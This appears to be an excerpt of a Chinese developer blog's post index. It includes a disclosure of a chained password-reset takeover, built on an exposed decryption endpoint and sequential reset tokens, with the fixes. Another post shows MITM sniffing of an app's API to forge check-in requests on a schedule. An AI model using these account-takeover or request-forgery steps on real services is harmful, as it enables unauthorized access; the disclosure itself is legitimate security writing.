、工程開發上的精華，雖然 2020 的產文量不如之前、還曾經停止更新了三四個月；但重質不重量，2020 撰寫的文章雖少但表現其實都比之前的好；慢慢有在進步！另外去年也用 Google site 把個人網站弄起來了；並持續會把 Medium 新文章消息同步過去。zhgchg.li初衷我還是那個我，我是很懶的人；不會為了寫文章而寫，每篇文章都是自己醞釀了些心得然後立刻下筆記錄下來的歷程，如果發懶沒有一口氣做這件事，我應該也懶得回頭寫了（不過這多半是不重要、不有趣的議題我才會這樣）。缺點就是有時候一頭熱，寫太快，打錯字是小如果內容有錯或不夠完整誤導大家真是罪孽 Orz；所以今年在寫文章時會把能想到、能處理的問題都一並研究處理，就算我當初專案上沒有用到；就算不能處理也留下個訊息提醒讀者還有這個方面要注意。寫文章用到的 Chrome Extension 再推一次 Code Medium 這個 ，可以直接在 Medium 之中使用 Gist 貼上漂亮的程式碼！安裝好之後，在 Medium 上點「+」然後選最後一個「&lt;&gt;」這時畫面會分為左右，可以直接在右方輸入程式碼：送出之後就會直接以 gist 嵌入 Medium 文章中：使用 gist 嵌入程式碼的好處是，支援彩色高亮，方便讀者閱讀；壞處是如果想把 Medium 轉成 markdown 格式時，無法自動將嵌入的程式碼一起轉換，要自己手動 Copy &amp; Paste。 - 試過很多轉換工具都不支援 gist 擷取，如果有朋友知道懇請補充。 - Medium 內建的程式碼區塊到現在都還不支援彩色高亮顯示，所以只能這樣。 Medium Next Generation Stats ：加強 Medium 後台統計數據顯示每日流量聚合顯示，一眼就能看出今天的流量文章組成。另外還有統計新增的追蹤者、拍手…等等功能。今年目標備份計畫除了繼續寫作外；預計會找個時間把每篇文章都翻成 Markdown 版本並上傳到 Github 進行備份，防止哪一天 Medium 突然爆炸…，目前是使用 Typora 這個編輯器；蠻好用的，之後再來介紹！Typora目前進度大約完成 15%，因為很無聊所以有點懶 哈哈。 Medium 官方的備份下載只有備份純文字，圖片都還是外連沒有下載回來；更何況程式碼的部分都是內嵌，不能直接在 Markdown 顯示。獨立網域已經部署上去了，請參考「 Medium 自訂網域功能回歸 」。 Profile 頁： blog.zhgchg.li （我是只用子網域 blog.zhgchg.li ，因為主網域有其他用途）但發現會影響 Google SEO，還在考慮＆測試要不要真的使用。Buy Me A Coffee！最近也開通了以下服務： Buy Me A Coffee 讚賞公民反正我很閒統計最後還是要來個統計！2020 年一共發表了：16 篇文章： 3 篇生活 + 2 篇開箱 + 11 篇技術文章全站累積至 2021/02/24 ： 所有文章瀏覽次數： 180, 000 次（成長 2倍） 所有文章拍手總計： 1,1000 次（成長 1 倍） 追蹤者：突破 400 位（成長 1 倍）表現比較好的文章有： iOS UIViewController 轉場二三事 iOS 逆向工程初體驗 iOS 14 剪貼簿竊資恐慌，隱私與便利的兩難 Apple Watch Series 6 開箱 &amp; 兩年使用體驗 使用 iPhone 簡單製作「偽」透視透明手機桌布 2020 一樣感謝大家的支持與愛護，今年也會繼續加油的！ 你的回饋就是我寫作的原動力！ZhgChgLi, 2021/02/24.有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 224 Total Views Last Statistics Date: 2025-01-19 | 205 Views on Medium. " }, { "title": "Medium 自訂網域功能回歸", "url": "/posts/d9a95d4224ea/", "categories": "ZRealm Life.", "tags": "medium, 生活, domain-names, domain-authority, domain-registration", "date": "2021-02-24 02:25:15 +0800", "snippet": "Medium 自訂網域功能回歸自己的 Domain Authority 自己養！[2024/07/28] 功能回歸Setting up a custom domain for your profile or publication一波三折，此功能在 2012 年開放過，後來又關閉；在 2021 年重新開放，2022 年又宣布關閉；最近 2024 年再回來看發現官方又重新開放了，並且更新了完整...", "content": "Medium 自訂網域功能回歸自己的 Domain Authority 自己養！[2024/07/28] 功能回歸Setting up a custom domain for your profile or publication一波三折，此功能在 2012 年開放過，後來又關閉；在 2021 年重新開放，2022 年又宣布關閉；最近 2024 年再回來看發現官方又重新開放了，並且更新了完整的設定步驟文件，可參考最新的官方文件進行設定， 網域註冊流程教學再參考本文內容 。 Setting up a custom domain for your profile or publication 大家可趁開放的時候趕快設定使用，不知道官方哪一天又想關閉；已設定的自訂網域不受影響。 我 2021 就設定了 https://blog.zhgchg.li 中間官方關閉自訂網域功能，但依然有效，至今也都能正常使用Breaking News!Medium 官方部落格於 2021/02/17 發布最新消息，Medium 又能重新讓創作者綁定自己的網域（Domain）啦！不論事創作者 Profile 頁或是 Publications 都支援設定。什麼是「自訂網域」為了怕讀者不一定都是資訊領域出生，這邊簡單說明一下什麼是自訂網域。網域（Domain）如同網路世界的門牌，我輸入門牌 Medium.com 就會到 Medium；如今開放讓創作者自訂網域，也就是自訂門牌，你可以註冊好自己想要的門牌，然後綁定到 Medium…This post is behind Medium’s paywall, View the full post on Medium, converted by ZMediumToMarkdown.===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 1,797 Total Views Last Statistics Date: 2025-01-19 | 1,761 Views on Medium. " }, { "title": "揭露一個幾年前發現的巧妙網站漏洞", "url": "/posts/142244e5f07a/", "categories": "ZRealm Dev.", "tags": "ios-app-development, hacker, web-security, website-security-test, capture-the-flag", "date": "2021-02-22 21:27:06 +0800", "snippet": "揭露一個幾年前發現的巧妙網站漏洞多個漏洞合併引起的網站資安問題Photo by Tarik Haiga前言幾年前還有在邊支援網頁開發的時候；被指派任務要為公司內部工程組舉辦 CTF 競賽；一開始初想是依照公司產品分組互相攻防入侵，但身為主辦，為了想先瞭解掌握程度就先對公司旗下各產品進行入侵測試；看看我自己能找到幾個漏洞，確保活動流程不會出問題。 但最後因為比賽時間有限、工程區別差異太大；所...", "content": "揭露一個幾年前發現的巧妙網站漏洞多個漏洞合併引起的網站資安問題Photo by Tarik Haiga前言幾年前還有在邊支援網頁開發的時候；被指派任務要為公司內部工程組舉辦 CTF 競賽；一開始初想是依照公司產品分組互相攻防入侵，但身為主辦，為了想先瞭解掌握程度就先對公司旗下各產品進行入侵測試；看看我自己能找到幾個漏洞，確保活動流程不會出問題。 但最後因為比賽時間有限、工程區別差異太大；所以最後以工程共通基礎知識及有趣的方向出題，有興趣的朋友可參考我之前的文章「 如何打造一場有趣的工程CTF競賽 」；裡面有很多腦洞大開的題目！找到的漏洞一共在三個產品中找到四個漏洞，除了本文準備提及的問題之外還有以下三個常見網站漏洞被我發現： Never Trust The Client! 問題很入門，就是前端直接將 ID 送給後端，而且後端還直接認了；這邊應該要改成認 Token。 重設密碼設計缺陷 實際有點忘了，只記得是程式設計有缺陷；導致重設密碼步驟可以繞過信箱驗證。 XSS 問題 本文將介紹的漏洞查找方式一律以黑箱測試，其中只有發現 XSS 問題的產品是我有參與過程式開發，其他都沒有也沒看過程式碼。漏洞現況身為白帽駭客，所有找到的問題都已在第一時間回報工程團隊和修復了；目前也過了兩年，想想是時候可以公開了；但顧及前公司立場，本文不會提到是哪個產品出現此漏洞，大家就只要參考這個漏洞發現的歷程及原因就好！漏洞後果此漏洞可讓入侵者隨意變更目標使用者密碼，並使用新密碼登入目標使用者帳號，盜取個人資料、從事非法操作。漏洞主因如同標題所述，此漏洞是由多個原因組合觸發；包含以下因素： 帳號登入未支援兩階段驗證、設備綁定 重設密碼驗證使用流水號 網站資料加密功能存在解密漏洞 加解密功能濫用 驗證令牌設計錯誤 後端未二次驗證欄位正確性 平台上使用者信箱為公開資訊漏洞重現方式因平台上使用者信箱為公開資訊，所以我們先在平台上瀏覽目標入侵帳號；知道信箱後前往重設密碼頁。 首先先輸入自己的信箱進行重設密碼操作 再輸入想入侵帳號的信箱，一樣進行重設密碼操作以上兩個操作都會寄出重設密碼驗證信。進到自己的信箱去收自己那一封重設密碼驗證信。變更密碼連結為以下網址格式：https://zhgchg.li/resetPassword.php?auth=PvrrbQWBGDQ3LeSBBydPvrrbQWBGDQ3LeSBByd 就是此次重設密碼操作的驗證令牌。但我在觀察網站上驗證碼圖片時發現驗證碼圖片的連結格式也是類似：https://zhgchg.li/captchaImage.php?auth=6EqfSZLqDc6EqfSZLqDc 顯示出 5136 。那把我們的密碼重設 Token 塞進去會怎樣？管他的！ 塞塞看！ Bingo!但驗證碼圖片太小，無法得到完整的資訊。我們繼續找可利用的點…剛好網站為了防止爬蟲侵擾，會將用戶的公開個人資料信箱，用 圖片呈現 ，關鍵字： 圖片呈現！圖片呈現！圖片呈現！立刻打開來看看：個人資料頁網頁原始碼部分我們也得到了類似的網址格式結果：https://zhgchg.li/mailImage.php?mail=V3sDblZgDGdUOOBlBjpRblMTDGwMbwFmUT10bFN6DDlVbAVtV3sDblZgDGdUOOBlBjpRblMTDGwMbwFmUT10bFN6DDlVbAVt 顯示出 zhgchgli@gmail.com一樣管他的！塞爆！ Bingo!🥳🥳🥳 PvrrbQWBGDQ3LeSBByd = 2395656反解出重設密碼令牌，發現是數字之後我想了該不會是流水號吧。。。於是再輸入一次信箱請求重設密碼，將新收到的信的 Token 解出來，得到 2395657 … what the fxck…還真的是知道是流水後之後就好辦事了，所以一開始的操作才會是先請求自己帳號的重設密碼信，再請求要入侵的目標；因為已經可以預測到下一個請求密碼的 id 了。 再來只需要想辦法將 2395657 換回 Token 令牌即可！好巧不巧又發現個問題 網站在編輯資料時的信箱格式驗證只有前端驗證，後端並未二次驗證格式是否正確…繞過前端驗證後，將信箱改為下一位目標 Fire in the hole!我們得到：https://zhgchg.li/mailImage.php?mail=UTVRZwZuDjMNPLZhBGI這時候將此密碼重設令牌，帶回密碼重設頁面： 入侵成功！繞過驗證重設他人密碼！最後因為沒有二階段登入保護、設備綁定功能；所以密碼被覆蓋掉之後就能直接登入冒用了。事出有因重新梳理一下整件事的流程。 一開始我們要重設密碼，但發現重設密碼的令牌實際上是一個流水號，而非真正的唯一識別 Token 網站濫用加解密功能，沒有區分功能使用；全站幾乎都用同一組 網站存在線上任意加解密入口（等於密鑰報廢） 後端未二次驗證使用者輸入 沒有二階段登入保護、設備綁定功能修正方式 最根本的是重設密碼的令牌應該要是隨機產生的唯一識別 Token 網站加解密部分，應該區分功能使用不同密鑰 避免外部可以任意操作資料加解密 後端應該要驗證使用者輸入 以防萬一，增加二階段登入保護、設備綁定功能總結整個漏洞發現之路令我驚訝，因為很多都是基本的設計問題；雖然功能上單看來說是可以運作，有小洞洞也還算安全；但多個破洞組合起來就會變成一個大洞，在開發上真的要小心謹慎為妙。延伸閱讀 如何打造一場有趣的工程CTF競賽 APP有用HTTPS傳輸，但資料還是被偷了 找回密碼之簡訊驗證碼強度安全問題有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 1,926 Total Views Last Statistics Date: 2025-01-19 | 1,918 Views on Medium. " }, { "title": "使用 Python+Google Cloud Platform+Line Bot 自動執行例行瑣事", "url": "/posts/70a1409b149a/", "categories": "ZRealm Dev.", "tags": "google-cloud-platform, cloud-functions, cloud-scheduler, ios-app-development, python", "date": "2021-02-20 19:55:51 +0800", "snippet": "使用 Python+Google Cloud Platform+Line Bot 自動執行例行瑣事以簽到獎勵 APP 為例，打造每日自動簽到腳本Photo by Paweł Czerwiński起源一直以來都有使用 Python 做小工具的習慣；有做正經的，工作上自動爬數據、產報表，也有不正經的，排程自動查想要的資訊或是交給腳本完成本來要手動執行的動作。一直以來「自動」這件事，我都很粗暴直接...", "content": "使用 Python+Google Cloud Platform+Line Bot 自動執行例行瑣事以簽到獎勵 APP 為例，打造每日自動簽到腳本Photo by Paweł Czerwiński起源一直以來都有使用 Python 做小工具的習慣；有做正經的，工作上自動爬數據、產報表，也有不正經的，排程自動查想要的資訊或是交給腳本完成本來要手動執行的動作。一直以來「自動」這件事，我都很粗暴直接開一台電腦掛著 Python 腳本讓他掛著跑；優點是簡單方便，缺點是要有台設備接著網路接著電；就算是樹莓派也是要消耗著微量的電費網路錢，還有也不能遠端控制啟動或關閉（其實可以，但很麻煩）；這次趁著工作空擋，研究了一下免費&amp;上雲端的方法。目標 將 Python 腳本搬到雲端執行、定時自動執行、可透過網路開啟/關閉。 本篇以我耍的小聰明，針對簽到獎勵型 APP 撰寫的自動完成簽到的腳本為例，能每日自動幫我簽到，我不用在特別打開 APP 使用；並在執行完成後發通知給我。完成通知！本篇章節順序 使用 Proxyman 進行 Man in the middle attack API 嗅探 撰寫 Python 腳本，偽造 APP API 請求（模擬簽到動作） 將 Python 腳本搬到 Google Cloud 上 在 Google Cloud 設定自動排程 因涉及到敏感領域本篇不會告知是哪個簽到獎勵型 APP，大家可以延伸自行使用 如果只想了解 Python 怎麼串自動執行可跳過前半段 Man in the middle attack API 嗅探部分，從第 3 章看起 。使用到的工具 Proxyman ：Man in the middle attack API 嗅探 Python ：撰寫腳本 Linebot ：發送腳本執行結果通知給自己 Google Cloud Function ：Python 腳本寄存服務 Google Cloud Scheduler ：自動排程服務1.使用 Proxyman 進行 Man in the middle attack API 嗅探之前有發過一篇「 APP有用HTTPS傳輸，但資料還是被偷了。 」的文章，道理類似，不過這次改用 Proxyman 取代 mitmproxy；同樣免費，但更好用。 到官網 https://proxyman.io/ 下載 Proxyman 工具 下載完後啟動 Proxyman，安裝 Root 憑證（為了做 Man in the middle attack 解包 https 流量內容）「Certificate 」-&gt;「 Install Certificate On this Mac」-&gt;「Installed &amp; Trusted」電腦的 Root 憑證裝好後換手機的：「Certificate 」-&gt;「 Install Certificate On iOS」-&gt;「Physical Devices…」依照指示在手機上掛好 Proxy 並完成憑證安裝及啟用。 在手機上打開想要嗅探 API 傳輸內容的 APP這時候 Mac 上的 Proxyman 就會出現嗅探到的流量，點擊裝置 IP 下想要查看的 APP API 網域；第一次查看需要先點「Enable only this domain」之後的流量才能被解包出來。「Enable only this domain」後就能看到新攔截的流量就會出現原始的 Request、Response 資訊： 我們使用此方法嗅探 APP 上操作簽到時打了哪隻 API EndPoint 及帶了哪些資料，將這些資訊記錄下來，等下使用 Python 直接模擬請求。 ⚠️要注意有的 APP token 資訊可能會換，導致日後 Python 模擬請求失效，還要多了解 APP token 交換的方式。 ⚠️如果確定 Proxyman 有正常運作，但在掛 Proxyman 的情況下 APP 無法發出請求，代表 APP 可能有做 SSL Pining；目前無解，只能放棄。 ⚠️APP 開發者想知道怎麼防範嗅探可參考 之前的文章 。這邊假設我們得到的資訊如下：POST /usercenter HTTP/1.1Host: zhgchg.liContent-Type: application/x-www-form-urlencodedCookie: PHPSESSID=dafd27784f94904dd586d4ca19d8ae62Connection: keep-aliveAccept: */*User-Agent: (iPhone12,3;iOS 14.5)Content-Length: 1076Accept-Language: zh-twAccept-Encoding: gzip, deflate, brAuthToken: 123452. 撰寫 Python 腳本，偽造 APP API 請求（模擬簽到動作） 在撰寫 Python 腳本之前，我們可先使用 Postman 調試一下參數，觀察看看哪個參數是必要的或是有時效會改變；但要直接照搬也可以。checkIn.py:import requestsimport jsondef main(args): results = {} try: data = { \"action\" : \"checkIn\" } headers = { \"Cookie\" : \"PHPSESSID=dafd27784f94904dd586d4ca19d8ae62\", \"AuthToken\" : \"12345\", \"User-Agent\" : \"(iPhone12,3;iOS 14.5)\" } request = requests.post('https://zhgchg.li/usercenter', data = data, headers = headers) result = json.loads(request.content) if result['status_code'] == 200: return \"CheckIn Success!\" else: return result['message'] except Exception as e: return str(e) ⚠️ main(args) 這邊的 args 用途後面會講，如果要在本地測試直接帶 main(True) 就好。使用 Requests 套件幫我們執行 HTTP Request，如果出現：ImportError: No module named requests請先使用 pip install requests 安裝套件。加上執行結果 Linebot 通知：這部分我做的很簡單，僅共參考，僅通知自己。 前往&amp;啟用 Line Developers Console 開發者 建立一個 Provider 選擇「Create a Messaging API channel」下一步填好基本訊息後按「Create」送出建立。 建立好之後在第一個「Basic settings」Tab 下面找到「Your user ID」區塊，這就是你的 User ID 建立好之後，選擇「Messaging API」Tab，掃描 QRCode 將機器人加入好友。 繼續往下滾找到「Channel access token」區塊，點擊「Issue」產生 token。 複製下來產生出來的 Token，我們有這組 Token 就能發訊息給使用者。 有了 User Id 跟 Token 之後我們就能發訊息給自己了。 因沒有要做其他功能所以連 python line sdk 都不用裝，直接打 http 發。串上之前的 Python 腳本後…checkIn.py:import requestsimport jsondef main(args): results = {} try: data = { \"action\" : \"checkIn\" } headers = { \"Cookie\" : \"PHPSESSID=dafd27784f94904dd586d4ca19d8ae62\", \"AuthToken\" : \"12345\", \"User-Agent\" : \"(iPhone12,3;iOS 14.5)\" } request = requests.post('https://zhgchg.li/usercenter', data = data, headers = headers) result = json.loads(request.content) if result['status_code'] == 200: sendLineNotification(\"CheckIn Success!\") return \"CheckIn Success!\" else: sendLineNotification(result['message']) return result['message'] except Exception as e: sendLineNotification(str(e)) return str(e) def sendLineNotification(message): data = { \"to\" : \"這邊帶你的 User ID\", \"messages\" : [ { \"type\" : \"text\", \"text\" : message } ] } headers = { \"Content-Type\" : \"application/json\", \"Authorization\" : \"這邊帶channel access token\" } request = requests.post('https://api.line.me/v2/bot/message/push',json = data, headers = headers)測看看通知有沒有發成功：Success! 小插曲，通知部分我本來是想用 Gmail SMTP 用信件來發，結果上到 Google Cloud 後發現無法使用…3. 將 Python 腳本搬到 Google Cloud 上前面基本的講完了，正式進入本篇重頭戲；將 Python 腳本搬上雲端。這部分我一開始向中的是 Google Cloud Run 但用了下覺得太複雜，我實際懶得研究，因為我的需求太小用不到這麼多功能；所以 我用的是 Google Cloud Function serverless 方案；實際上比較常用來做的是構建 serverless web 服務。 如果沒使用過 Google Cloud 的朋友，請先前往 主控台 新增好專案＆設定好帳單資訊 在專案主控台首頁，資源的地方點擊「Cloud Functions」 上方選擇「建立函式」 輸入基本資訊 ⚠️記下「 觸發網址」區域可選： US-WEST1 、 US-CENTRAL1 、 US-EAST1 可享 Cloud Storage 服務免費額度。 asia-east2 (Hong Kong) 靠我們比較近，但需要支付微微的 Cloud Storage 費用。 ⚠️建立 Cloud Functions 時會需要 Cloud Storage 寄存程式碼。 ⚠️詳細計價方式請參考文末。觸發條件選： HTTP驗證： 依需求，我希望我能從外部點連結執行腳本，所以選擇「允許未經驗證的叫用」；如果選擇需要驗證，後續 Scheduler 服務也要做相應設定。變數、網路及進階設定可在變數中設定變數給 Python 使用（這樣參數有變動就不用改到 Python 程式碼）：在 Python 中調用的方式：import osdef main(request): return os.environ.get('test', 'DEFAULT VALUE')其他設定都不需要動，直接「儲存」-&gt;「下一步」。 執行階段選「Python 3.x」並將寫好的 Python 腳本貼上，進入點改成「main」補充 main(args) ，同前述，此項服務比較是用來做 serverless web；所以 args 實際是 Request 物件，你能從其中拿到 http get query 及 http post body 資料，具體方式如下：取得 GET Query 資訊：request_args = args.argsexample: ?name=zhgchgli =&gt; request_args = [“name”:”zhgchgli”]取得 POST Body 資料：request_json = request.get_json(silent=True)example: name=zhgchgli =&gt; request_json = [“name”:”zhgchgli”]如果使用 Postman 測試 POST 記得使用「Raw+JSON」POST 資料，否則不會有東西： 程式碼部分 OK 之後，切換到「requirements.txt」輸入有用到的套件依賴：我們使用「request」這個套件幫我們打 API，此套件不在原生 Python 庫裡面；所以我們要在這裡加上去：requests&gt;=2.25.1這邊指定版本 ≥ 2.25.1，也可不指定只輸入 requests 安裝最新版。 都 OK 之後點擊「部署」開始部署。需要花約 1~3 分鐘的時間等他部署完成。 部署完成後可由前面記下的「 觸發網址 」前去執行查看是否正確運行，或使用「動作」-&gt;「測試函式」進行測試如果出現 500 Internal Server Error 則代表程式有錯，可點擊名稱進入查看「紀錄」，在其中找到原因：UnboundLocalError: local variable 'db' referenced before assignment 點擊名稱進入後也可按「編輯」修改腳本內容 測試沒問題就完成了！我們已經順利將 Python 腳本搬上雲端。補充關於變數部分依照我們的需求，我們需要能有個地方存放、讀取簽到 APP 的 token；因為 token 可能會失效；需要重新要求並寫入共下次執行時使用。想要從外部動態傳入變數到腳本中有以下方法： [Read Only] 前述所提到的，執行階段環境變數 [Temp] Cloud Functions 有提供一個 /tmp 目錄共執行時寫入、讀取檔案，但結束後就會刪除，詳情請參考 官方文件 。 [Read Only] GET/POST 傳送資料 [Read Only] 放入附加檔案在程式中使用相對路徑 ./ 就能讀取到， 僅限讀取無法動態修改 ；要修改只能在控制台這修改＆重新部署。 想要可以讀取、動態修改就需要串接其他 GCP 服務，例如：Cloud SQL、Google Storage、Firebase Cloud Firestore… [Read &amp; Write] 這邊我選擇的是 Firebase Cloud Firestore 因為目前只有此方案有免費額度使用。按照 入門步驟 ，建立好 Firebase 專案後；進入 Firebase 後台：在左方選單列找到「 Cloud Firestore 」-&gt;「 新增集合 」輸入集合 ID。輸入資料內容。一個集合可以有多個文件，每個文件可以有各自的欄位內容；使用上非常彈性。在 Python 中使用：請先到 GCP控制台 -&gt; IAM與管理 -&gt; 服務帳戶 ，按照以下步驟下載身份驗證私鑰文件：首先選擇帳號：下方「新增金鑰」-&gt;「建立新的金鑰」選擇「JSON」下載檔案。將此 JSON 檔案放到同 Python 的專案目錄下。本地開發環境下：pip install --upgrade firebase-admin安裝 firebase-admin 套件。在 Cloud Functions 上要在 requirements.txt 中多加入 firebase-admin 。環境弄好後，可以來讀取我們剛剛新增的數據了：firebase_admin.py:import firebase_adminfrom firebase_admin import credentialsfrom firebase_admin import firestoreif not firebase_admin._apps: cred = credentials.Certificate('./身份驗證.json') firebase_admin.initialize_app(cred)# 因若重複 initialize_app 會報以下錯誤# providing an app name as the second argument. In most cases you only need to call initialize_app() once. But if you do want to initialize multiple apps, pass a second argument to initialize_app() to give each app a unique name.# 所以安全起見在 initialize_app 前先檢查是否已 initdb = firestore.client()ref = db.collection(u'example') //集合名稱stream = ref.stream()for data in stream: print(\"id:\"+data.id+\",\"+data.to_dict()) 如果是在 Cloud Functions 上除了可以把 身份驗證 JSON 檔一起上傳上去，也可以在使用時將連接語法改成以下使用：cred = credentials.ApplicationDefault()firebase_admin.initialize_app(cred, { 'projectId': project_id,})db = firestore.client() 如果出現 Failed to initialize a certificate credential. ，請檢查身份驗證 JSON 是否正確。新增、刪除更多操作請參考 官方文件 。4. 在 Google Cloud 設定自動排程有了腳本之後再來是要讓他自動執行才能達到我們的最終目標。 前往 Google Cloud Scheduler 控制台首頁 上方「建立工作」 輸入工作基本資料執行頻率： 同 crontab 輸入方式，如果你對 crontab 語法不熟，可以直接使用 crontab.guru 這個神器網站 ：他能很直白的翻譯給你所設定的語法實際意思。（點 next 可查看下次執行時間） 這邊我設定 15 1 * * * ，因為簽到每天只需要執行一次，設在每日凌晨 1:15 執行。網址部分： 輸入前面記下的「 觸發網址 」時區： 輸入「台灣」，選擇台北標準時間HTTP 方法： 照前面 Python 程式碼我們用 Get 就好如果前面有設「驗證」 記得展開「SHOW MORE」進行驗證設定。都填好後 ，按下「 建立 」。 建立成功後可選擇「立即執行」測試一下正不正常。 可查看執行結果、上次執行日期 ⚠️ 請注意，執行結果「失敗」僅針對 web status code 是 400~500 或 python 程式有錯誤。大功告成！我們已達成將例行任務 Python 腳本上傳到雲端＆設定自動排成自動執行的目標。計價方式還有一部分很重要，就是計價方式；Google Cloud、Linebot 都不是全免費服務，所以了解收費方式很重要；不然為了一個小小的腳本，付出太多的金錢那不如電腦開著掛著跑哩。Linebot參考 官方定價 資訊，一個月 500 則內免費。Google Cloud Functions參考 官方定價 資訊，每月有 200 萬次叫用、400,000 GB/秒和 200,000 GHz/秒的運算時間、 5 GB 的網際網路輸出流量。Google Firebase Cloud Firestore參考 官方定價 資訊，有 1 GB 大小容量、每月 10 GB 流量、每天 50,000 次讀取、20,000 次寫入/刪除；輕量使用很夠用了！Google Cloud Scheduler參考 官方定價 資訊，每個帳號有 3 項免費工作可設定。 對腳本來說以上免費用量就綽綽有餘啦！Google Cloud Storage 有條件免費東躲西躲，還是躲不掉可能被收費的服務。Cloud Functions 建立好之後會自動建立兩個 Cloud Storage 實體：如果剛剛 Cloud Functions 選擇的是 US-WEST1、US-CENTRAL1 或 US-EAST1 這三個地區則可享有免費使用額度：我是選擇 US-CENTRAL1 沒錯，可以看到第一個 Cloud Storage 實體的地區是 US-CENTRAL1 沒錯，但第二個是寫 美國多個地區 ； 我自已估計這項是會被收費的 。參考 官方定價 資訊，依照主機地區不同有不同的價格。程式碼沒多大，估計應該就是每個月最低收費 0.0X0 元（？ ⚠️以上資訊均為 2021/02/21 時撰寫時紀錄，實際以當前價格為主，僅共參考。計價預算控制通知just in case…假設真的有狀況超出免費用量開始計價，我希望能收到通知；避免可能程式錯誤暴衝造成帳單金額報表卻渾然不知。。。 前往 主控台 找到「 計費功能 」Card：點擊「 查看詳細扣款紀錄 」進入。 展開左邊選單，進入「 預算與快訊 」功能 點擊上方「 設定預算 」 輸入自訂名稱下一步。 金額，輸入「 目標金額 」，可輸入 $1、$10；我們不希望在小東西上花太。下一步。動作這邊可以設定當預算達到多少百分比時會觸發通知。勾選 「 透過電子郵件將快訊傳送給帳單管理員和使用者 」，這樣當條件處發時就能第一時間收到通知。點擊「完成」送出儲存。當預算超過時我們就能馬上就能知道，避免產生更多費用。總結人的精力是有限的，現今科技資訊洪流，每個平台每個服務都想要榨取我們有限的精力；如果能透過一些自動化腳本分擔我們的日常生活，聚沙成塔，讓我們省下更多精力專心在重要的事情之上！延伸閱讀 Slack 打造全自動 WFH 員工健康狀況回報系統 Crashlytics + Big Query 打造更即時便利的 Crash 追蹤工具 Crashlytics + Google Analytics 自動查詢 App Crash-Free Users Rate APP有用HTTPS傳輸，但資料還是被偷了。 如何打造一場有趣的工程CTF競賽 iOS 14 剪貼簿竊資恐慌，隱私與便利的兩難 運用 Google Apps Script 轉發 Gmail 信件到 Slack有任何問題及指教歡迎 與我聯絡 。有自動化相關優化需求也歡迎 發案給我 ，謝謝。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 13,204 Total Views Last Statistics Date: 2025-01-19 | 12,812 Views on Medium. " }, { "title": "重灌筆記1-Laravel Homestead + phpMyAdmin 環境建置", "url": "/posts/87090f101b9a/", "categories": "ZRealm Dev.", "tags": "ios-app-development, php, laravel, vagrant, virtualbox", "date": "2021-02-05 14:01:41 +0800", "snippet": "[重灌筆記1] -Laravel Homestead + phpMyAdmin 環境建置從 0 到 1 建置 Laravel 開發環境並搭配 phpMyAdmin GUI 管理 MySql 資料庫Laravel 最近把 Mac Reset 一遍，紀錄一下重新還原 Laravel 開發環境的步驟。環境需求 Vagrant ：虛擬環境配置工具 VirtualBox ：免費虛擬機軟體，如果已...", "content": "[重灌筆記1] -Laravel Homestead + phpMyAdmin 環境建置從 0 到 1 建置 Laravel 開發環境並搭配 phpMyAdmin GUI 管理 MySql 資料庫Laravel 最近把 Mac Reset 一遍，紀錄一下重新還原 Laravel 開發環境的步驟。環境需求 Vagrant ：虛擬環境配置工具 VirtualBox ：免費虛擬機軟體，如果已有購買 Parallels 也可直接使 Parallels（但需要安裝 plug-in ）下載、安裝完這兩個軟體後，繼續下一步設定。 VirtualBox 安裝時會要求要重新開機還有要到「設定」-&gt;「安全性與隱私權」-&gt;「Allow VirtualBox」才能啟用所有服務。配置 Homestead 環境git clone https://github.com/laravel/homestead.git ~/Homesteadcd ~/Homesteadgit checkout releasebash init.shphpMyAdmin phpMyAdmin 是一個以PHP為基礎，以Web-Base方式架構在網站主機上的MySQL的資料庫管理工具，讓管理者可用Web介面管理MySQL資料庫。藉由此Web介面可以成為一個簡易方式輸入繁雜SQL語法的較佳途徑，尤其要處理大量資料的匯入及匯出更為方便。 — Wiki phpMyAdmin到 phpMyAdmin 官網下載最新版本回來。解壓縮 .zip -&gt; 資料夾 -&gt; 重新命名資料夾名稱 -&gt; 「phpMyAdmin」：將 phpMyAdmin 資料夾移動到 ~/Homestead 資料夾中：phpMyAdmin 設定在 phpMyAdmin 資料夾中找到 config.sample.inc.php ，將其改名為 config.inc.php ，並使用編輯器打開，修改成以下設定：&lt;?php/* vim: set expandtab sw=4 ts=4 sts=4: *//** * phpMyAdmin sample configuration, you can use it as base for * manual configuration. For easier setup you can use setup/ * * All directives are explained in documentation in the doc/ folder * or at &lt;https://docs.phpmyadmin.net/&gt;. * * @package PhpMyAdmin */declare(strict_types=1);/** * This is needed for cookie based authentication to encrypt password in * cookie. Needs to be 32 chars long. */$cfg['blowfish_secret'] = ''; /* YOU MUST FILL IN THIS FOR COOKIE AUTH! *//** * Servers configuration */$i = 0;/** * First server */$i++;/* Authentication type */$cfg['Servers'][$i]['auth_type'] = 'config';/* Server parameters */$cfg['Servers'][$i]['host'] = 'localhost';$cfg['Servers'][$i]['user'] = 'homestead';$cfg['Servers'][$i]['password'] = 'secret';$cfg['Servers'][$i]['compress'] = false;$cfg['Servers'][$i]['AllowNoPassword'] = false;/** * phpMyAdmin configuration storage settings. *//* User used to manipulate with storage */// $cfg['Servers'][$i]['controlhost'] = '';// $cfg['Servers'][$i]['controlport'] = '';// $cfg['Servers'][$i]['controluser'] = 'pma';// $cfg['Servers'][$i]['controlpass'] = 'pmapass';/* Storage database and tables */// $cfg['Servers'][$i]['pmadb'] = 'phpmyadmin';// $cfg['Servers'][$i]['bookmarktable'] = 'pma__bookmark';// $cfg['Servers'][$i]['relation'] = 'pma__relation';// $cfg['Servers'][$i]['table_info'] = 'pma__table_info';// $cfg['Servers'][$i]['table_coords'] = 'pma__table_coords';// $cfg['Servers'][$i]['pdf_pages'] = 'pma__pdf_pages';// $cfg['Servers'][$i]['column_info'] = 'pma__column_info';// $cfg['Servers'][$i]['history'] = 'pma__history';// $cfg['Servers'][$i]['table_uiprefs'] = 'pma__table_uiprefs';// $cfg['Servers'][$i]['tracking'] = 'pma__tracking';// $cfg['Servers'][$i]['userconfig'] = 'pma__userconfig';// $cfg['Servers'][$i]['recent'] = 'pma__recent';// $cfg['Servers'][$i]['favorite'] = 'pma__favorite';// $cfg['Servers'][$i]['users'] = 'pma__users';// $cfg['Servers'][$i]['usergroups'] = 'pma__usergroups';// 